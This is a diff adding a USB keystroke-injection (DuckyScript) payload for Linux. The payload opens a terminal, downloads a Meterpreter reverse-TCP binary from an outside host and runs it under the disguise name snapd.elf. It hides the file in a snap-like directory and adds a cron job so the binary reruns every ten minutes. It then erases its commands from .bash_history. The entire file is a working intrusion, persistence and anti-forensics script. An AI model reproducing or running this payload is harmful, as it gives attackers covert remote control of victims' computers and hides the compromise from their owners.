@@ -1,0 +1,50 @@
+DEFAULT_DELAY 200
+REM // wait for the system to recognize the usb device
+DELAY 1000
+GUI a
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING wget pwnpoc.duckdns.org:80/linux_meterpreter_reverse_tcp.elf
+ENTER
+DELAY 1500
+STRING mv linux_meterpreter_reverse_tcp.elf snapd.elf
+ENTER
+STRING chmod 700 snapd.elf
+ENTER 
+STRING ./snapd.elf &
+ENTER
+STRING mkdir .snapd
+ENTER
+STRING mkdir .snapd/snap-store
+ENTER
+STRING mkdir .snapd/snap-store/common
+ENTER
+STRING mv snapd.elf .snapd/snap-store/common/
+ENTER
+REM // select the default editor so that crontab command won't ask for it later
+STRING select-editor
+REM // select the default editor (nano)
+ENTER
+DELAY 100
+ENTER
+REM // add the payload to current user's crontab (execute every 10 minutes)
+STRING (crontab -l && echo "*/10 * * * * /home/$USER/.snapd/snap-store/common/snapd.elf") | crontab -
+ENTER
+DELAY 100
+REM // close the terminal (commands for the session will be written to .bash_history)
+STRING exit
+ENTER
+DELAY 1000
+GUI a
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+REM // remove the last 11 lines from .bash_history
+STRING head -n -11 .bash_history > tmp.txt && mv tmp.txt .bash_history
+ENTER
+DELAY 100
+STRING exit
+ENTER
